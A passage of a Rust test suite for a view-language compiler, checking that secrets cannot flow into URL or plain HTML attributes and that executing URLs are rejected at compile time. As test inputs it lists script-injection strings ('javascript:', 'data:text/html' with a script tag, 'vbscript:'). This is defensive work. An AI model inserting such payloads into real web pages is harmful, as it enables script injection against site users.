        "the path must name the escape: {path:?}"
    );
    assert!(
        error.notes.iter().any(|(span, _)| *span != error.span),
        "the path must name a second span, not only the escape's own"
    );
}

/// The same rule for the other element that carries one today.
#[test]
fn a_link_href_that_is_a_secret_is_rejected_by_the_flow_pass() {
    let src = with_view("        Link href is apiKey\n            Text \"here\"");
    assert!(
        ifc_codes(&src).contains(&"E-IFC-11"),
        "{:?}",
        ifc_codes(&src)
    );
}

/// **Every** URL-bearing attribute, enumerated from the rule rather than
/// from a list written out here.
///
/// The enforcement ranges over the attribute *name* on every element,
/// because an unrecognised named argument reaches the DOM as the attribute
/// of that name — so `Text src is apiKey` is a leak on an element whose
/// signature has no `src` at all. A rule keyed on the element would let
/// every one of these through.
#[test]
fn every_url_bearing_attribute_is_a_sink() {
    // Counted, because the assertion is inside the loop: an emptied
    // `URL_ATTRIBUTES` would remove the rule and pass this test.
    assert_eq!(
        zdc_hir::URL_ATTRIBUTES.len(),
        18,
        "the URL attribute list changed size"
    );
    let mut scanned = 0;
    for attribute in zdc_hir::URL_ATTRIBUTES {
        let src = with_view(&format!("        Text \"a\", {attribute} is apiKey"));
        let codes = ifc_codes(&src);
        scanned += 1;
        assert!(
            codes.contains(&"E-IFC-11"),
            "`{attribute}` is in URL_ATTRIBUTES but is not a sink: {codes:?}"
        );
    }
    assert_eq!(scanned, zdc_hir::URL_ATTRIBUTES.len());
}

/// **The ruling on non-URL attributes.** They are sinks, and they were
/// already: the view sink is the DOM, not the visible text. `id`, `class`
/// and `alt` are in the serialised document, in view-source, in the
/// devtools inspector, and readable by any script on the page — so a
/// secret in one has left the server exactly as a rendered one has.
///
/// It is E-IFC-05 rather than E-IFC-11 on purpose. The two name different
/// escapes: a non-URL attribute discloses the value to whoever reads the
/// page, and a URL-bearing one *transmits* it to a host the value itself
/// chooses, which is a leak even in a document nobody ever looks at.
#[test]
fn a_secret_in_a_plain_attribute_is_still_the_view_sink() {
    for attribute in ["id", "class", "alt", "title"] {
        let src = with_view(&format!("        Text \"a\", {attribute} is apiKey"));
        let codes = ifc_codes(&src);
        assert!(
            codes.contains(&"E-IFC-05"),
            "`{attribute}` must still be refused: {codes:?}"
        );
        assert!(
            !codes.contains(&"E-IFC-11"),
            "`{attribute}` is not a request the browser sends: {codes:?}"
        );
    }
}

/// A `javascript:` URL is refused at **compile time**, by the pass that
/// owns URL positions, and not sanitised into silence.
#[test]
fn an_executing_url_literal_is_a_compile_error() {
    for url in [
        "javascript:alert(1)",
        "JavaScript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
    ] {
        let src = with_view(&format!(
            "        Link href is \"{url}\"\n            Text \"go\""
        ));
        let (_, _, verdict) = verdict(&src);
        let error = verdict
            .errors()
            .find(|e| e.code == "E-URL-01")
            .unwrap_or_else(|| panic!("`{url}` was not refused"));
        assert!(
            error.message.contains("executes rather than fetches"),
            "{}",
            error.message
        );
    }
}

/// The repaired twin, per §17.3.9 item 3: the pass must not pass by
/// rejecting every URL. This is `page.zd`'s shape — a relative link, an
/// absolute one, an image, and a URL built from data by `each` — and it
/// must be accepted whole.
#[test]
fn a_page_of_real_links_still_compiles() {
    let src = "\
record Note
    slug  is Text
    title is Text

state notes is client List of Note starting [(Note with slug is \"/notes/signals\", title is \"Signals\")]

view
    Column
        Link href is \"/\"
            Text \"home\"
        Link href is \"https://example.com/feed.xml\"
            Text \"feed\"
        Link href is \"mailto:someone@example.com\"
            Text \"write\"
        Image source is \"/assets/desk.png\", alt is \"A desk\"
        each note in notes
            Link href is note.slug
                Text note.title
";
    let (_, split, verdict) = verdict(src);
    assert!(
        !split.has_errors(),
        "the split rejected it: {:?}",
        split
            .errors()
            .map(|e| e.rendered_message())
            .collect::<Vec<_>>()
    );
    assert!(
        !verdict.has_errors(),
        "a page of ordinary links must compile: {:?}",
        verdict
            .errors()
            .map(|e| e.rendered_message())
            .collect::<Vec<_>>()
    );
}

/// A public value in a URL is not a leak, on the element that carries one.
#[test]
fn a_public_url_is_not_an_outbound_leak() {
    let src = with_view("        Image source is shown, alt is \"a\"");
    let codes = ifc_codes(&src);
    assert!(codes.is_empty(), "{codes:?}");
}

/// The soundness bug the obligation key fixed, in the new sink's own
/// terms: two URL arguments sharing nothing but a span must not discharge
/// each other. `SinkSite::UrlArgument` carries the expression, so they
/// cannot.
#[test]
fn two_url_arguments_are_two_obligations() {
    let src = with_view(
        "        Image source is shown, alt is \"a\"\n        Image source is apiKey, alt is \"b\"",
    );
    let codes = ifc_codes(&src);
    assert!(
        codes.contains(&"E-IFC-11"),
        "the public one must not discharge the secret one: {codes:?}"
    );
}
